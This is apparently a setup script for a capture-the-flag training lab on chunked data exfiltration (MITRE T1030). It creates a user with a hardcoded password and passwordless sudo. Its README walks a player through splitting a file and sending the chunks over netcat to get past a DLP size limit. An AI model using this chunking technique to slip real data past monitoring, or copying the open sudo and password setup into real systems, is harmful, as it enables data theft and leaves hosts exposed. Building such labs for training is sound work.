#!/bin/bash
set -euo pipefail
PLAYER="player"; PASS="Player@123"
FLAG="HACKTIFY{CHUNKED_TRANSFER_$(hostname|sha256sum|cut -c1-8)}"
id "$PLAYER" &>/dev/null || { useradd -m -s /bin/bash "$PLAYER"; echo "$PLAYER:$PASS"|chpasswd; }
echo "$PLAYER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/player-chunk; chmod 440 /etc/sudoers.d/player-chunk
mkdir -p /opt/sensitive-data
# Create a large file to split for chunked exfil
python3 -c "
import random, string
data = '$FLAG\n'
for i in range(500):
    data += ''.join(random.choices(string.ascii_letters + string.digits, k=80)) + '\n'
print(data)
" > /opt/sensitive-data/large_dataset.txt
chmod 644 /opt/sensitive-data/large_dataset.txt
cat > /home/$PLAYER/README.txt << 'RMEOF'
=== T1030 Data Transfer Size Limits (Chunked Exfiltration) ===
Login  : player / Player@123
Goal   : Bypass per-transfer DLP size limits by splitting data into small chunks.
         Target file: /opt/sensitive-data/large_dataset.txt (~40KB)
         DLP blocks transfers >10KB in single request.
Steps  :
  1. Check file size: ls -lh /opt/sensitive-data/large_dataset.txt
  2. Start "DLP-enforced" receiver: python3 -c "..." (see solution)
  3. Split file: split -b 5000 /opt/sensitive-data/large_dataset.txt /tmp/chunk_
  4. Send each chunk: for f in /tmp/chunk_*; do nc -q1 localhost 6666 < $f; done
  5. Reassemble: cat received_chunks > reconstructed.txt
RMEOF
chown $PLAYER:$PLAYER /home/$PLAYER/README.txt
echo "[+] T1030 setup complete."
